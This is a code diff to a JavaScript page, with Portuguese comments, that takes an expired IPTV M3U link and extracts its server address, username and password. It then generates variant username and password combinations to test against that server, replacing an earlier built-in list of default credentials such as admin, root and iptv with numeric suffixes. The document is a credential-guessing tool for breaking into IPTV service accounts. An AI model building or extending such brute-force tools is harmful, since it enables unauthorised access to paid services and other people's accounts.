@@ -43,23 +43,14 @@
     let ativos = [];
     let combos = [];
 
-    function gerarCombos() {
-      const bases = ['admin', 'user', 'teste', 'demo', 'iptv', 'root', 'guest', '1234', 'live', 'tv'];
+    function gerarCombos(usuario, senha) {
       const combosGerados = [];
-
-      bases.forEach(base => {
-        for (let i = 0; i <= 100; i++) {
-          combosGerados.push({user: base+i, pass: base+i});
-          combosGerados.push({user: base, pass: base});
-        }
-      });
-
-      combosGerados.push({user: 'user', pass: '1234'});
-      combosGerados.push({user: 'admin', pass: '1234'});
-      combosGerados.push({user: 'iptv', pass: 'iptv123'});
-      combosGerados.push({user: 'demo', pass: 'demo'});
-      combosGerados.push({user: 'root', pass: 'root'});
-
+      // Gerar combinações novas com base nas informações extraídas da lista M3U
+      for (let i = 0; i <= 10; i++) {
+        combosGerados.push({ user: usuario + i, pass: senha + i });
+        combosGerados.push({ user: usuario, pass: senha + i });
+        combosGerados.push({ user: usuario + i, pass: senha });
+      }
       return combosGerados;
     }
 
@@ -76,7 +67,6 @@
       const m3u = document.getElementById('m3u').value.trim();
       const resultadoDiv = document.getElementById('resultado');
       ativos = [];
-      combos = gerarCombos();
 
       if (!m3u) {
         alert("Cole o link M3U vencido!");
@@ -91,6 +81,15 @@
       }
 
       const { ip, porta } = extraido;
+
+      // Extraímos o login e senha do link M3U (podemos extrair com regex ou outra lógica)
+      const regexLoginSenha = /username=([^&]+)&password=([^&]+)/;
+      const matchLoginSenha = m3u.match(regexLoginSenha);
+      let usuario = matchLoginSenha ? matchLoginSenha[1] : 'usuario';
+      let senha = matchLoginSenha ? matchLoginSenha[2] : 'senha';
+
+      // Gerar combinações baseadas nos dados extraídos
+      combos = gerarCombos(usuario, senha);
 
       resultadoDiv.innerHTML = `[+] Gerando ${combos.length} combinações e testando...\nServidor: ${ip}:${porta}\n`;
 
